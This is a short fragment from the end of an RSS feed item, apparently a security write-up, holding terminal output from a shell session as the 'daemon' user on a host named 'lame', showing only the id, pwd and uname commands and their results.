uid=1(daemon) gid=1(daemon) groups=1(daemon)
pwd
/tmp
uname -a
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
  </channel>
</rss>
